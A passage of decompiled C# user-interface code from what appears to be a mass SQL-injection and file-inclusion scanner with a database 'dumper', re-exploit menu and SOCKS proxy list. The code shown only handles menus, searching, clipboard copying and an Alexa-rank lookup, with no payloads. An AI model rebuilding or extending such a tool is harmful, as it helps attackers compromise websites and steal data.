					mnuQueueRomove.Visible = (dataGridView.SelectedRows.Count > 0) & dataGridView.Rows[e.RowIndex].Selected;
					goto IL_0230;
					IL_0230:
					num = 27;
					mnuQueueSelectAll.Visible = dataGridView.RowCount > 1;
					goto IL_0247;
					IL_0247:
					num = 28;
					mnuQueueSP1.Visible = (dataGridView.SelectedRows.Count > 0) & dataGridView.Rows[e.RowIndex].Selected;
					goto IL_027a;
					IL_027a:
					num = 29;
					mnuQueueSP2.Visible = (dataGridView.SelectedRows.Count > 0) & dataGridView.Rows[e.RowIndex].Selected;
					goto IL_02ad;
					IL_02ad:
					num = 30;
					mnuQueueSP3.Visible = (dataGridView.SelectedRows.Count > 0) & dataGridView.Rows[e.RowIndex].Selected;
					goto IL_02e0;
					IL_02e0:
					num = 31;
					mnuQueue.Tag = RuntimeHelpers.GetObjectValue(sender);
					goto IL_02f4;
					IL_02f4:
					num = 32;
					mnuQueue.Show(Control.MousePosition);
					break;
					end_IL_0001_2:
					break;
				}
				dataGridView = null;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 940;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_158(object sender, CancelEventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool autoScroll = default(bool);
		ToolStripItem toolStripItem = default(ToolStripItem);
		bool flag = default(bool);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool visible = default(bool);
		IEnumerator enumerator = default(IEnumerator);
		bool flag4 = default(bool);
		object left = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 1222:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_001d;
						case 4:
							goto IL_003f;
						case 5:
							goto IL_0062;
						case 6:
							goto IL_007e;
						case 7:
							goto IL_00a2;
						case 8:
							goto IL_00ac;
						case 9:
							goto IL_00b7;
						case 10:
							goto IL_00cf;
						case 11:
							goto IL_00df;
						case 12:
							goto IL_00ef;
						case 13:
							goto IL_00ff;
						case 14:
							goto IL_010e;
						case 15:
							goto IL_011d;
						case 16:
							goto IL_0162;
						case 17:
							goto IL_018d;
						case 18:
							goto IL_01a8;
						case 19:
							goto IL_01ba;
						case 20:
							goto IL_01cc;
						case 21:
							goto IL_01e8;
						case 22:
							goto IL_01f7;
						case 23:
							goto IL_0209;
						case 24:
							goto IL_0219;
						case 25:
						case 26:
							goto IL_0255;
						case 27:
							goto IL_0264;
						case 28:
							goto IL_0273;
						case 29:
							goto IL_0283;
						case 30:
							goto IL_0293;
						case 31:
							goto IL_02a3;
						case 32:
							goto IL_02b3;
						case 33:
							goto IL_02c3;
						case 34:
							goto IL_02f1;
						case 36:
							goto IL_0315;
						case 37:
							goto IL_032d;
						case 38:
							goto IL_033c;
						case 40:
							goto IL_034e;
						case 41:
							goto IL_0366;
						case 43:
							goto IL_0377;
						case 44:
							goto IL_038f;
						case 35:
						case 39:
						case 42:
						case 45:
							goto IL_039e;
						case 46:
							goto IL_03a5;
						case 48:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 47:
						case 49:
						case 50:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_039e:
					num = 45;
					if (!autoScroll)
					{
						break;
					}
					goto IL_03a5;
					IL_03a5:
					num = 46;
					mnuLWAutoScroll.Text = Globals.translate_0.GetStr(this, 62);
					goto end_IL_0001_3;
					IL_038f:
					num = 44;
					autoScroll = Globals.DG_FileInclusao.AutoScroll;
					goto IL_039e;
					IL_00a2:
					num = 7;
					toolStripItem.Visible = flag;
					goto IL_00ac;
					IL_000a:
					num = 2;
					flag = Conversions.ToBoolean(mnuLWSelectAll.Tag);
					goto IL_001d;
					IL_001d:
					num = 3;
					flag2 = ((DataGridView)mnuListView.Tag).SelectedRows.Count == 1 && flag;
					goto IL_003f;
					IL_003f:
					num = 4;
					flag3 = ((DataGridView)mnuListView.Tag).SelectedRows.Count > 0 && flag;
					goto IL_0062;
					IL_0062:
					num = 5;
					visible = ((DataGridView)mnuListView.Tag).RowCount > 0;
					goto IL_007e;
					IL_007e:
					num = 6;
					enumerator = mnuListView.Items.GetEnumerator();
					goto IL_00ae;
					IL_00ae:
					if (enumerator.MoveNext())
					{
						toolStripItem = (ToolStripItem)enumerator.Current;
						goto IL_00a2;
					}
					goto IL_00b7;
					IL_00b7:
					num = 9;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto IL_00cf;
					IL_00ac:
					num = 8;
					goto IL_00ae;
					IL_00cf:
					num = 10;
					mnuLWSelectAll.Visible = visible;
					goto IL_00df;
					IL_00df:
					num = 11;
					mnuLWSelectAllSP.Visible = visible;
					goto IL_00ef;
					IL_00ef:
					num = 12;
					mnuLWExport.Visible = visible;
					goto IL_00ff;
					IL_00ff:
					num = 13;
					mnuLWAutoScroll.Visible = true;
					goto IL_010e;
					IL_010e:
					num = 14;
					mnuLWAutoScrollSP.Visible = true;
					goto IL_011d;
					IL_011d:
					num = 15;
					mnuLWSelected.Text = Globals.translate_0.GetStr(this, 61) + Globals.FormatNumbers(((DataGridView)mnuListView.Tag).SelectedRows.Count);
					goto IL_0162;
					IL_0162:
					num = 16;
					mnuLWSelected.Visible = ((DataGridView)mnuListView.Tag).SelectedRows.Count > 1;
					goto IL_018d;
					IL_018d:
					num = 17;
					flag4 = mnuListView.Tag == dtgSQLi && flag3;
					goto IL_01a8;
					IL_01a8:
					num = 18;
					mnuLWGoNewDumper.Visible = flag4 && flag2;
					goto IL_01ba;
					IL_01ba:
					num = 19;
					mnuLWGoDumper.Visible = flag4 && flag2;
					goto IL_01cc;
					IL_01cc:
					num = 20;
					mnuLWGoDumper.Enabled = !DumperForm.Boolean_0;
					goto IL_01e8;
					IL_01e8:
					num = 21;
					mnuLWGoFileDumper.Visible = false;
					goto IL_01f7;
					IL_01f7:
					num = 22;
					mnuLWGoNewDumperSP.Visible = flag4 && flag2;
					goto IL_0209;
					IL_0209:
					num = 23;
					if (mnuLWGoFileDumper.Visible)
					{
						goto IL_0219;
					}
					goto IL_0255;
					IL_0219:
					num = 24;
					mnuLWGoFileDumper.Visible = !string.IsNullOrEmpty(Conversions.ToString(dtgSQLi.SelectedRows[0].Cells[4].Value));
					goto IL_0255;
					IL_0255:
					num = 26;
					mnuLWAlexa.Visible = flag2;
					goto IL_0264;
					IL_0264:
					num = 27;
					mnuLWShell.Visible = flag2;
					goto IL_0273;
					IL_0273:
					num = 28;
					mnuLWClipboard.Visible = flag3;
					goto IL_0283;
					IL_0283:
					num = 29;
					mnuLWRemoveSP.Visible = flag3;
					goto IL_0293;
					IL_0293:
					num = 30;
					mnuLWRemove.Visible = flag3;
					goto IL_02a3;
					IL_02a3:
					num = 31;
					mnuLWTrash.Visible = flag3;
					goto IL_02b3;
					IL_02b3:
					num = 32;
					mnuLWReExploiter.Visible = flag3;
					goto IL_02c3;
					IL_02c3:
					num = 33;
					mnuLWReExploiter.Enabled = !((enum6_0 == Enum6.const_2) | (enum6_0 == Enum6.const_3) | (enum6_0 == Enum6.const_5));
					goto IL_02f1;
					IL_02f1:
					num = 34;
					left = NewLateBinding.LateGet(mnuListView.Tag, null, "Name", new object[0], null, null, null);
					goto IL_0315;
					IL_0315:
					num = 36;
					if (Operators.ConditionalCompareObjectEqual(left, dtgSQLi.Name, TextCompare: false))
					{
						goto IL_032d;
					}
					goto IL_034e;
					IL_032d:
					num = 37;
					autoScroll = Globals.DG_SQLi.AutoScroll;
					goto IL_033c;
					IL_033c:
					num = 38;
					mnuLWReExploiter.Visible = flag3;
					goto IL_039e;
					IL_034e:
					num = 40;
					if (Operators.ConditionalCompareObjectEqual(left, dtgSQLiNoInjectable.Name, TextCompare: false))
					{
						goto IL_0366;
					}
					goto IL_0377;
					IL_0366:
					num = 41;
					autoScroll = Globals.DG_SQLiNoInjectable.AutoScroll;
					goto IL_039e;
					IL_0377:
					num = 43;
					if (Operators.ConditionalCompareObjectEqual(left, dtgFileInclusao.Name, TextCompare: false))
					{
						goto IL_038f;
					}
					goto IL_039e;
					end_IL_0001_2:
					break;
				}
				num = 48;
				mnuLWAutoScroll.Text = Globals.translate_0.GetStr(this, 63);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 1222;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_159(object sender, EventArgs e)
	{
		Globals.ShellUrl(Conversions.ToString(((DataGridView)mnuListView.Tag).SelectedRows[0].Cells[1].Value));
	}

	private void method_160(object sender, EventArgs e)
	{
		mnuLWAlexa.Enabled = false;
		mnuLWAlexa.Tag = RuntimeHelpers.GetObjectValue(((DataGridView)mnuListView.Tag).SelectedRows[0].Cells[1].Value);
		bckAlexa.RunWorkerAsync(RuntimeHelpers.GetObjectValue(mnuLWAlexa.Tag));
	}

	private void method_161(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				DataGridView dataGridView = (DataGridView)mnuListView.Tag;
				StringBuilder stringBuilder = new StringBuilder();
				int num = dataGridView.SelectedRows.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (i > 0)
					{
						stringBuilder.AppendLine();
					}
					stringBuilder.Append(RuntimeHelpers.GetObjectValue(dataGridView.SelectedRows[i].Cells[1].Value));
				}
				Clipboard.SetText(stringBuilder.ToString());
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox(ex2.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_162(object sender, EventArgs e)
	{
		((DataGridView)mnuListView.Tag).SelectAll();
	}

	private void method_163(object sender, EventArgs e)
	{
		List<string> list = new List<string>();
		DataGridViewRow dataGridViewRow = ((DataGridView)mnuListView.Tag).SelectedRows[0];
		string text = Conversions.ToString(dataGridViewRow.Cells[6].Value);
		checked
		{
			if (!string.IsNullOrEmpty(text))
			{
				string[] array = Strings.Split(text, ";");
				for (int i = 0; i < array.Length; i++)
				{
					string text2 = array[i];
					if (text2.Contains("]"))
					{
						text2 = text2.Substring(text2.IndexOf("]") + 1).Trim();
						if (text2.Contains("."))
						{
							list.Add(text2);
						}
					}
				}
			}
			method_9(Conversions.ToString(dataGridViewRow.Cells[1].Value), Conversions.ToString(dataGridViewRow.Cells[2].Value), list);
			dataGridViewRow = null;
		}
	}

	private void method_164(object sender, EventArgs e)
	{
		DataGridView dataGridView = (DataGridView)mnuListView.Tag;
		DumperForm.method_76();
		DumperForm.txtURL.Text = Conversions.ToString(dataGridView.SelectedRows[0].Cells[1].Value);
		DumperForm.cmbSqlType.Text = Conversions.ToString(dataGridView.SelectedRows[0].Cells[2].Value);
		DumperForm.method_90(null, null);
		if (bool_3)
		{
			mdiTabControl.SelectItem(2);
		}
		else
		{
			twMain.SelectedNode = treeNode_3;
		}
	}

	private void method_165(object sender, DataGridViewCellEventArgs e)
	{
		switch (e.ColumnIndex)
		{
		case 1:
		case 3:
		case 4:
		case 6:
		case 8:
			return;
		}
		mnuListView.Tag = RuntimeHelpers.GetObjectValue(sender);
		method_164(null, null);
	}

	private void method_166(object sender, EventArgs e)
	{
	}

	private void method_167(object sender, EventArgs e)
	{
		using Exporter exporter = new Exporter((DataGridView)mnuListView.Tag);
		exporter.Text = mnuLWExport.Text;
		exporter.ShowDialog(this);
	}

	private void method_168(object sender, EventArgs e)
	{
		foreach (DataGridViewRow selectedRow in ((DataGridView)mnuListView.Tag).SelectedRows)
		{
			Globals.GTrash.method_0(Conversions.ToString(selectedRow.Cells[1].Value));
		}
		method_169(null, null);
	}

	private void method_169(object sender, EventArgs e)
	{
		object left = NewLateBinding.LateGet(mnuListView.Tag, null, "Name", new object[0], null, null, null);
		if (Operators.ConditionalCompareObjectEqual(left, dtgSQLi.Name, TextCompare: false))
		{
			Globals.DG_SQLi.method_4();
		}
		else if (Operators.ConditionalCompareObjectEqual(left, dtgSQLiNoInjectable.Name, TextCompare: false))
		{
			Globals.DG_SQLiNoInjectable.method_4();
		}
		else if (Operators.ConditionalCompareObjectEqual(left, dtgFileInclusao.Name, TextCompare: false))
		{
			Globals.DG_FileInclusao.method_4();
		}
	}

	private void method_170(object sender, EventArgs e)
	{
		bool autoScroll;
		if (Operators.CompareString(mnuLWAutoScroll.Text, Globals.translate_0.GetStr(this, 62), TextCompare: false) == 0)
		{
			mnuLWAutoScroll.Text = Globals.translate_0.GetStr(this, 63);
			autoScroll = false;
		}
		else
		{
			autoScroll = true;
			mnuLWAutoScroll.Text = Globals.translate_0.GetStr(this, 62);
		}
		object left = NewLateBinding.LateGet(mnuListView.Tag, null, "Name", new object[0], null, null, null);
		if (Operators.ConditionalCompareObjectEqual(left, dtgSQLi.Name, TextCompare: false))
		{
			Globals.DG_SQLi.AutoScroll = autoScroll;
		}
		else if (Operators.ConditionalCompareObjectEqual(left, dtgSQLiNoInjectable.Name, TextCompare: false))
		{
			Globals.DG_SQLiNoInjectable.AutoScroll = autoScroll;
		}
		else if (Operators.ConditionalCompareObjectEqual(left, dtgFileInclusao.Name, TextCompare: false))
		{
			Globals.DG_FileInclusao.AutoScroll = autoScroll;
		}
	}

	private void method_171(object sender, KeyPressEventArgs e)
	{
		if (Strings.Asc(e.KeyChar) == 13)
		{
			bool flag;
			if ((flag = true) == (sender == txtSQLiSearch))
			{
				method_172(btnSQLiSearch, null);
			}
			else if (flag == (txtSQLiNoInjectableSearch == txtSQLiSearch))
			{
				method_172(btnSQLiNoInjectableSearch, null);
			}
			else if (flag == (txtFileInclusaoSearch == txtSQLiSearch))
			{
				method_172(btnFileInclusaoSearch, null);
			}
			e.Handled = true;
		}
	}

	private void method_172(object sender, EventArgs e)
	{
		BackgroundWorker backgroundWorker = new BackgroundWorker();
		backgroundWorker.DoWork += method_174;
		backgroundWorker.RunWorkerCompleted += method_175;
		object[] array = new object[3];
		bool flag;
		if ((flag = true) == (sender == btnSQLiSearch) || flag == (sender == btnSQLiSearchClear))
		{
			array[0] = Globals.DG_SQLi;
			array[1] = txtSQLiSearch.Text;
			array[2] = cmbSQLiSearch.SelectedIndex;
			tsSQLi.Enabled = false;
		}
		else if (flag == (sender == btnSQLiNoInjectableSearch) || flag == (sender == btnSQLiNoInjectableSearchClear))
		{
			array[0] = Globals.DG_SQLiNoInjectable;
			array[1] = txtSQLiNoInjectableSearch.Text;
			array[2] = cmbSQLiNoInjectableSearch.SelectedIndex;
			tsSQLiNoInjectable.Enabled = false;
		}
		else if (flag == (sender == btnFileInclusaoSearch) || flag == (sender == btnFileInclusaoSearchClear))
		{
			array[0] = Globals.DG_FileInclusao;
			array[1] = txtFileInclusaoSearch.Text;
			array[2] = cmbFileInclusaoSearch.SelectedIndex;
			tsFileInclusao.Enabled = false;
		}
		bool flag2;
		if ((flag2 = true) == (sender == btnSQLiSearchClear) || flag2 == (sender == btnSQLiNoInjectableSearchClear) || flag2 == (sender == btnFileInclusaoSearchClear))
		{
			array[1] = "";
			array[2] = 0;
		}
		Application.DoEvents();
		backgroundWorker.RunWorkerAsync(array);
	}

	private void method_173(object sender, EventArgs e)
	{
		if (sender == null)
		{
			return;
		}
		ToolStripComboBox toolStripComboBox = (ToolStripComboBox)sender;
		if (toolStripComboBox.SelectedIndex < 0)
		{
			return;
		}
		bool flag;
		if ((flag = true) == (toolStripComboBox == cmbSQLiFilter))
		{
			if (Globals.DG_SQLi != null)
			{
				Globals.DG_SQLi.method_0((Class29.Enum2)toolStripComboBox.SelectedIndex);
				method_172(btnSQLiSearch, null);
			}
		}
		else if (flag == (toolStripComboBox == cmbSQLiNoInjectableFilter))
		{
			if (Globals.DG_SQLiNoInjectable != null)
			{
				Globals.DG_SQLiNoInjectable.method_0((Class29.Enum2)toolStripComboBox.SelectedIndex);
				method_172(btnSQLiNoInjectableSearch, null);
			}
		}
		else if (flag == (toolStripComboBox == cmbFileInclusaoFilter) && Globals.DG_FileInclusao != null)
		{
			Globals.DG_FileInclusao.method_0((Class29.Enum2)toolStripComboBox.SelectedIndex);
			method_172(btnFileInclusaoSearch, null);
		}
	}

	private void method_174(object sender, DoWorkEventArgs e)
	{
		try
		{
			if (base.InvokeRequired)
			{
				Invoke(new Delegate50(method_174), sender, e);
				return;
			}
			Class29 @class = (Class29)NewLateBinding.LateIndexGet(e.Argument, new object[1] { 0 }, null);
			string text = Conversions.ToString(NewLateBinding.LateIndexGet(e.Argument, new object[1] { 1 }, null));
			int num = Conversions.ToInteger(NewLateBinding.LateIndexGet(e.Argument, new object[1] { 2 }, null));
			@class.method_13(text, num);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_175(object sender, RunWorkerCompletedEventArgs e)
	{
		tsSQLi.Enabled = true;
		tsSQLiNoInjectable.Enabled = true;
		tsFileInclusao.Enabled = true;
	}

	private void method_176(object sender, EventArgs e)
	{
	}

	private void method_177(object sender, CancelEventArgs e)
	{
		e.Cancel = true;
	}

	private void method_178(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			mnuSearchColumn.Show(Control.MousePosition);
		}
	}

	private void method_179(object sender, EventArgs e)
	{
		if (cmbSearchColumn.SelectedItem != null)
		{
			cmbSearchColumn.Items.Remove(RuntimeHelpers.GetObjectValue(cmbSearchColumn.SelectedItem));
		}
		cmbSearchColumn.Text = "";
	}

	private void method_180(object sender, EventArgs e)
	{
		cmbSearchColumn.Items.Clear();
		cmbSearchColumn.Text = "";
	}

	private void method_181(object sender, EventArgs e)
	{
		cmbSearchColumn.Enabled = chkSearchColumn.Checked;
	}

	private void method_182(object sender, EventArgs e)
	{
		cmbSearchColumn2.Visible = chkSearchColumn2.Checked;
	}

	private void method_183(object sender, EventArgs e)
	{
		cmbSearchColumn3.Visible = chkSearchColumn3.Checked;
	}

	private void method_184(object sender, EventArgs e)
	{
		cmbSearchColumn4.Visible = chkSearchColumn4.Checked;
	}

	private void method_185(object sender, EventArgs e)
	{
		txtSearchFilter.Enabled = btnSearchFilter.Checked;
	}

	private void method_186(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 316:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0023;
						case 4:
							goto IL_003d;
						case 5:
							goto IL_0052;
						case 6:
						case 7:
						case 8:
							goto IL_005c;
						case 9:
							goto IL_0069;
						case 10:
							goto IL_00a2;
						case 11:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 12:
						case 13:
						case 14:
						case 15:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_005c:
					num = 8;
					DumperForm.method_76();
					goto IL_0069;
					IL_0069:
					num = 9;
					DumperForm.txtURL.Text = Conversions.ToString(dtgSQLi.SelectedRows[0].Cells[1].Value);
					goto IL_00a2;
					IL_0052:
					num = 5;
					if (bool_3)
					{
					}
					goto IL_005c;
					IL_00a2:
					num = 10;
					DumperForm.cmbSqlType.Text = Conversions.ToString(dtgSQLi.SelectedRows[0].Cells[2].Value);
					break;
					IL_000a:
					num = 2;
					if (((MouseEventArgs)e).Button != MouseButtons.Left)
					{
						goto end_IL_0001_3;
					}
					goto IL_0023;
					IL_0023:
					num = 3;
					if (dtgSQLi.SelectedRows.Count != 1)
					{
						goto end_IL_0001_3;
					}
					goto IL_003d;
					IL_003d:
					num = 4;
					if (DumperForm.Boolean_0)
					{
						goto end_IL_0001_3;
					}
					goto IL_0052;
					end_IL_0001_2:
					break;
				}
				num = 11;
				DumperForm.method_90(null, null);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 316;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_187(object sender, EventArgs e)
	{
		btnSearchColumnStart.Enabled = (dtgSQLi.SelectedRows.Count > 0) & (enum6_0 != Enum6.const_4);
	}

	private void method_188(object sender, KeyEventArgs e)
	{
		bool flag;
		Class29 @class = default(Class29);
		if ((flag = true) == (sender == dtgSQLi))
		{
			@class = Globals.DG_SQLi;
		}
		else if (flag == (sender == dtgSQLiNoInjectable))
		{
			@class = Globals.DG_SQLiNoInjectable;
		}
		else if (flag == (sender == dtgFileInclusao))
		{
			@class = Globals.DG_FileInclusao;
		}
		else if (flag == (sender == dtgQueue))
		{
			@class = Globals.DG_FileInclusao;
		}
		else if (flag == (sender == dtgSocks))
		{
			@class = Globals.DG_FileInclusao;
		}
		if (e.Control)
		{
			if (e.KeyCode == Keys.A)
			{
				@class.method_8();
			}
		}
		else if (e.KeyCode == Keys.Delete)
		{
			@class.method_4();
		}
		else if ((e.KeyCode == Keys.Return) & (sender == dtgSQLi))
		{
			MouseEventArgs e2 = new MouseEventArgs(MouseButtons.Left, 1, 1, 1, 0);
			method_186(dtgSQLi, e2);
		}
	}

	private void method_189(object sender, DataGridViewCellEventArgs e)
	{
		if (!bool_2)
		{
			return;
		}
		DataGridView dataGridView = (DataGridView)sender;
		if (dataGridView.Tag == null)
		{
			return;
		}
		Class29 @class = (Class29)dataGridView.Tag;
		string text = Conversions.ToString(dataGridView.Rows[e.RowIndex].Cells[e.ColumnIndex].Value);
		if (text == null)
		{
			text = "";
		}
		bool flag = true;
		if (e.ColumnIndex == 1)
		{
			if (!Class23.smethod_13(text))
			{
				flag = false;
			}
			if (dataGridView == dtgSQLi && !text.Contains("[t]"))
			{
				flag = false;
			}
		}
		checked
		{
			if (flag)
			{
				@class.method_3(text, e.ColumnIndex - 1, dataGridView.Rows[e.RowIndex]);
				return;
			}
			text = ((Class29.Class30)dataGridView.Rows[e.RowIndex].Tag).Items[e.ColumnIndex - 1];
			dataGridView.Rows[e.RowIndex].Cells[e.ColumnIndex].Value = text;
		}
	}

	private void method_190(object sender, DoWorkEventArgs e)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		List<string> list = new List<string>();
		try
		{
			string arg = Class23.smethod_11(Conversions.ToString(e.Argument));
			string text = $"https://www.alexa.com/siteinfo/{arg}";
			Http val = new Http();
			val.UserAgent = Conversions.ToString(Globals.GetObjectValue(Globals.GMain.txtUserAgent));
			val.Accept = Conversions.ToString(Globals.GetObjectValue(Globals.GMain.txtAccept));
			val.ConnectTimeout = Conversions.ToInteger(Globals.GetObjectValue(Globals.GMain.numHTTPTimeout));
			val.ReadTimeout = val.ConnectTimeout;
			val.FollowRedirects = true;
			val.AutoAddHostHeader = true;
			val.AllowGzip = true;
			val.SendCookies = true;
			val.SaveCookies = true;
			val.CookieDir = "memory";
			val.UseIEProxy = false;
			string text2 = val.QuickGetStr(text);
			if (text2.Contains("http://aws.amazon.com/awis -->"))
			{
				string text3 = text2.Substring(checked(text2.IndexOf("http://aws.amazon.com/awis -->") + "http://aws.amazon.com/awis -->".Length));
				text3 = text3.Substring(0, text3.IndexOf("<")).Trim();
				if (!string.IsNullOrEmpty(text3))
				{
					list.Add("Global Rank: " + text3);
				}
			}
			foreach (string item in list)
			{
				if (!item.Contains("N/A"))
				{
					DoWorkEventArgs doWorkEventArgs;
					(doWorkEventArgs = e).Result = Operators.ConcatenateObject(doWorkEventArgs.Result, item + "\r\n");
				}
			}
			if (string.IsNullOrEmpty(Conversions.ToString(e.Result)))
			{
				e.Result = "Not Found";
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			e.Result = ex2.Message;
			ProjectData.ClearProjectError();
		}
	}

	private void method_191(object sender, RunWorkerCompletedEventArgs e)
	{
		mnuLWAlexa.Enabled = true;
		if (e.Error != null)
		{
			MessageBox.Show(e.Error.Message);
			return;
		}
		using (new Class8(Globals.GMain))
		{
			string text = Class23.smethod_11(Conversions.ToString(mnuLWAlexa.Tag));
			if (MessageBox.Show(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(e.Result, "\r\n"), Globals.translate_0.GetStr(this, 64))), mnuLWAlexa.Text + " [" + text + "]", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
			{
				Globals.ShellUrl("http://www.alexa.com/siteinfo/" + text);
			}
		}
	}

	private void method_192(object sender, CancelEventArgs e)
	{
		e.Cancel = dtgSocks.Rows.Count == 0;
		mnuSocksSelectAll.Enabled = dtgSocks.Rows.Count > 1;
		mnuSocksRemove.Enabled = dtgSocks.SelectedRows.Count >= 1;
		mnuSocksCheck.Enabled = dtgSocks.Rows.Count >= 1;
		mnuSocksUnCheck.Enabled = dtgSocks.Rows.Count >= 1;
	}

	private void method_193(object sender, EventArgs e)
	{
		dtgSocks.SelectAll();
	}

	private void method_194(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		List<string> list = default(List<string>);
		Class35.Class36 @class = default(Class35.Class36);
		IEnumerator enumerator = default(IEnumerator);
		DataGridViewRow dataGridViewRow = default(DataGridViewRow);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 225:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 4:
							goto IL_0021;
						case 5:
							goto IL_0029;
						case 6:
							goto IL_004b;
						case 7:
							goto IL_005b;
						case 8:
							goto IL_006b;
						case 9:
							goto IL_0075;
						case 10:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
						case 11:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_006b:
					num = 8;
					goto IL_006d;
					IL_005b:
					num = 7;
					list.Add(@class.method_1(bool_1: false));
					goto IL_006b;
					IL_0075:
					num = 9;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					break;
					IL_004b:
					num = 6;
					@class = (Class35.Class36)dataGridViewRow.Tag;
					goto IL_005b;
					IL_000a:
					num = 2;
					if (dtgSocks.SelectedRows.Count == 0)
					{
						goto end_IL_0001_3;
					}
					goto IL_0021;
					IL_0021:
					num = 4;
					list = new List<string>();
					goto IL_0029;
					IL_0029:
					num = 5;
					enumerator = dtgSocks.SelectedRows.GetEnumerator();
					goto IL_006d;
					IL_006d:
					if (enumerator.MoveNext())
					{
						dataGridViewRow = (DataGridViewRow)enumerator.Current;
						goto IL_004b;
					}
					goto IL_0075;
					end_IL_0001_2:
					break;
				}
				num = 10;
				Globals.G_SOCKS.method_4(list.ToArray());
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 225;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_195(object sender, EventArgs e)
	{
		foreach (DataGridViewRow item in (IEnumerable)dtgSocks.Rows)
		{
			item.Cells[0].Value = true;
		}
	}

	private void method_196(object sender, EventArgs e)
	{
		foreach (DataGridViewRow item in (IEnumerable)dtgSocks.Rows)
		{
			item.Cells[0].Value = false;
		}
	}

	private void method_197(object sender, EventArgs e)
	{
		using NewSocks newSocks = new NewSocks();
		newSocks.ShowDialog(this);
	}

	private void method_198(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					break;
				case 241:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 3:
							goto end_IL_0001_3;
						}
						goto default;
					}
					end_IL_0001_2:
					break;
				}
				num = 2;
